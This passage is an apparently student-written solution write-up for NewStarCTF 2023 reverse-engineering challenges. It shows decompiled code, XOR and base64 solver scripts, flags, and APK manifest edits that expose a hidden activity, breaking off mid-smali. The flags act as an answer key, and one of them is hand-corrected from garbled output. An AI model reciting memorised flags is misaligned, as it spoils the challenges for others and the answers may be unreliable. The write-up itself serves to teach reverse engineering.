src="/2023/09/26/2023newstarctfWeek1/re2.png" class=""><p><code>flag&#123;You_ar3_g0od_at_f1nding_ELF_segments_name&#125;</code></p><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p>反编译，得到c代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  s = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input flag: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  v6 = (<span class="type">char</span> *)encode(s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(v6);</span><br><span class="line">  s1 = (<span class="type">char</span> *)base64_encode(v6, v3);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(v6);</span><br><span class="line">  <span class="built_in">free</span>(s1);</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现base64，对字符串进行解密</p><p>得到<code>V\QWkt $_e&#39;^_ggXQ&#39;u|v!c/m</code></p><p>分析encode函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">2</span> * v1 + <span class="number">1</span>);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v6++;</span><br><span class="line">    v4[v2] = (a1[i] ^ <span class="number">0x20</span>) + <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4[v6] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写出python解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;V\QWkt $_e\&#x27;^_ggXQ\&#x27;u|v!c/m&#x27;</span></span><br><span class="line">b=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    b+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">16</span>)^<span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;D04ou7nowwha7ELF1s?&#125;</code></p><h3 id="Endian"><a href="#Endian" class="headerlink" title="Endian"></a>Endian</h3><p>反编译，得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  v5 = v6;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v5 != (<span class="built_in">array</span>[i] ^ <span class="number">0x12345678</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v5 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are right&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中array为<code>dd 75553A1Eh, 7B583A03h, 4D58220Ch, 7B50383Dh, 736B3819h, 0</code>，shift+e提取数组元素，写出python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arrr=[ <span class="number">1968519710</span>, <span class="number">2069379587</span>, <span class="number">1297621516</span>, <span class="number">2068854845</span>, <span class="number">1936406553</span>, <span class="number">0</span> ]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arrr:</span><br><span class="line">    h=((i^<span class="number">0x12345678</span>))</span><br><span class="line">    value = h</span><br><span class="line"></span><br><span class="line">    nums = []</span><br><span class="line">    <span class="keyword">while</span> value &gt; <span class="number">0</span>:</span><br><span class="line">        nums.append(<span class="built_in">hex</span>(value &amp; <span class="number">0xFF</span>)) <span class="comment"># 取出低位部分，并转换为16进制字符串</span></span><br><span class="line">        value &gt;&gt;= <span class="number">8</span> <span class="comment"># 右移8位，获取下一个位置的部分</span></span><br><span class="line">    nums_str = [<span class="built_in">chr</span>(<span class="built_in">int</span>(num,<span class="number">16</span>)) <span class="keyword">for</span> num <span class="keyword">in</span> nums]</span><br><span class="line">    result_str = <span class="string">&#x27;&#x27;</span>.join(nums_str)</span><br><span class="line">    <span class="built_in">print</span>(result_str,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>执行拿到flag：<code>flag&#123;llittl_Endian_axV4</code></p><p>修改一下得到最后flag：<code>flag&#123;llittl_Endian_a&#125;</code></p><h3 id="AndroXor"><a href="#AndroXor" class="headerlink" title="AndroXor"></a>AndroXor</h3><p>Android killer打开，java反编译，入口处com.chick.androxor.MainActivity得到关键函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">Xor</span><span class="params">(String paramString1, String paramString2)</span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="type">char</span>[] arrayOfChar = <span class="keyword">new</span> <span class="title class_">char</span>[paramString1.length()];</span><br><span class="line">   <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> paramString1.length();</span><br><span class="line">   <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;wrong!!!&quot;</span>;</span><br><span class="line">   String str2;</span><br><span class="line">   <span class="keyword">if</span> (i != <span class="number">25</span>) &#123;</span><br><span class="line">     str2 = <span class="string">&quot;wrong!!!&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     str2 = <span class="string">&quot;you win!!!&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; paramString1.length(); i++)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> (<span class="type">char</span>)(paramString1.charAt(i) ^ paramString2.charAt(i % paramString2.length()));</span><br><span class="line">     arrayOfChar[i] = ((<span class="type">char</span>)j);</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">char</span>[] &#123; <span class="number">14</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="number">75</span>, <span class="number">73</span>, <span class="number">55</span>, <span class="number">32</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">62</span>, <span class="number">40</span>, <span class="number">64</span>, <span class="number">11</span>, <span class="number">39</span>, <span class="number">75</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">65</span>, <span class="number">13</span> &#125;[i] != j)</span><br><span class="line">     &#123;</span><br><span class="line">       str2 = str1;</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> str2;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在com.chick.androxor.MainActivity$1类中得到key为happyx3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View paramView)</span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="built_in">this</span>.val$password.getText().toString();</span><br><span class="line">   paramView = <span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>;</span><br><span class="line">   Toast.makeText(paramView, paramView.Xor(str, <span class="string">&quot;happyx3&quot;</span>), <span class="number">1</span>).show();</span><br><span class="line">   Log.d(<span class="string">&quot;输入&quot;</span>, <span class="built_in">this</span>.val$password.getText().toString());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>编写python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&quot;happyx3&quot;</span></span><br><span class="line">cipher = [<span class="number">14</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="number">75</span>, <span class="number">73</span>, <span class="number">55</span>, <span class="number">32</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">62</span>, <span class="number">40</span>, <span class="number">64</span>, <span class="number">11</span>, <span class="number">39</span>, <span class="number">75</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">65</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    result += <span class="built_in">chr</span>(cipher[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;3z_And0r1d_X0r_x1x1&#125;</code></p><h3 id="lazy-activtiy"><a href="#lazy-activtiy" class="headerlink" title="lazy_activtiy"></a>lazy_activtiy</h3><p>安装apk后打开发现要求我们打开另一个Activity来获得flag</p><p>查看apk配置文件AndroidManifest.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;32&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;12&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.droidlearn.activity_travel&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;32&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span> <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Activity_Travel&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.droidlearn.activity_travel.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将入口处改为FlagActivity，并且把FlagActivity的exported改为true</p><p>改后xml文件如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> standalone=<span class="string">&quot;no&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;32&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;12&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.droidlearn.activity_travel&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;32&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span> <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.Activity_Travel&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.droidlearn.activity_travel.MainActivity&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>重新编译后打开，发现要求点击按钮10000次才能获得flag。</p><p>分析smali语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">.<span class="keyword">class</span> <span class="title class_">Lcom</span>/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;</span><br><span class="line">.<span class="built_in">super</span> Ljava/lang/Object;</span><br><span class="line">.source <span class="string">&quot;FlagActivity.java&quot;</span></span><br><span class="line"></span><br><span class="line"># interfaces</span><br><span class="line">.<span class="keyword">implements</span> <span class="title class_">Landroid</span>/view/View$OnClickListener;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># annotations</span><br><span class="line">.annotation system Ldalvik/annotation/EnclosingMethod;</span><br><span class="line">    value = Lcom/droidlearn/activity_travel/FlagActivity;-&gt;onCreate(Landroid/os/Bundle;)V</span><br><span class="line">.end annotation</span><br><span class="line"></span><br><span class="line">.annotation system Ldalvik/annotation/InnerClass;</span><br><span class="line">    accessFlags = <span class="number">0x0</span></span><br><span class="line">    name = <span class="literal">null</span></span><br><span class="line">.end annotation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># instance fields</span><br><span class="line">.field <span class="keyword">final</span> synthetic <span class="built_in">this</span>$<span class="number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;</span><br><span class="line"></span><br><span class="line">.field <span class="keyword">final</span> synthetic val$str:Landroid/widget/EditText;</span><br><span class="line"></span><br><span class="line">.field <span class="keyword">final</span> synthetic val$tv_cnt:Landroid/widget/TextView;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># direct methods</span><br><span class="line">.method constructor &lt;init&gt;(Lcom/droidlearn/activity_travel/FlagActivity;Landroid/widget/TextView;Landroid/widget/EditText;)V</span><br><span class="line">    .locals <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">20</span></span><br><span class="line">    iput-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;<span class="built_in">this</span>$<span class="number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;</span><br><span class="line"></span><br><span class="line">    iput-object p2, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;val$tv_cnt:Landroid/widget/TextView;</span><br><span class="line"></span><br><span class="line">    iput-object p3, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;val$str:Landroid/widget/EditText;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># virtual methods</span><br><span class="line">.method <span class="keyword">public</span> <span class="title function_">onClick</span><span class="params">(Landroid/view/View;)</span>V</span><br><span class="line">    .locals <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">23</span></span><br><span class="line">    iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;val$tv_cnt:Landroid/widget/TextView;</span><br><span class="line"></span><br><span class="line">    iget-object v0, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;<span class="built_in">this</span>$<span class="number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v0&#125;, Lcom/droidlearn/activity_travel/FlagActivity;-&gt;access$<span class="number">004</span>(Lcom/droidlearn/activity_travel/FlagActivity;)I</span><br><span class="line"></span><br><span class="line">    move-result v0</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v0&#125;, Ljava/lang/Integer;-&gt;toString(I)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p1, v0&#125;, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">24</span></span><br><span class="line">    iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;<span class="built_in">this</span>$<span class="number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p1&#125;, Lcom/droidlearn/activity_travel/FlagActivity;-&gt;access$<span class="number">000</span>(Lcom/droidlearn/activity_travel/FlagActivity;)I</span><br><span class="line"></span><br><span class="line">    move-result p1</span><br><span class="line"></span><br><span class="line">    const/<span class="number">16</span> v0, <span class="number">0x2710</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>-lt p1, v0, :cond_0</span><br><span class="line"></span><br><span class="line">    .line <span class="number">25</span></span><br><span class="line">    iget-object p1, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;<span class="built_in">this</span>$<span class="number">0</span>:Lcom/droidlearn/activity_travel/FlagActivity;</span><br><span class="line"></span><br><span class="line">    iget-object v0, p0, Lcom/droidlearn/activity_travel/FlagActivity$<span class="number">1</span>;-&gt;val$str:Landroid/widget/EditText;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0&#125;, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0&#125;, Ljava/lang/Object;-&gt;toString()Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span 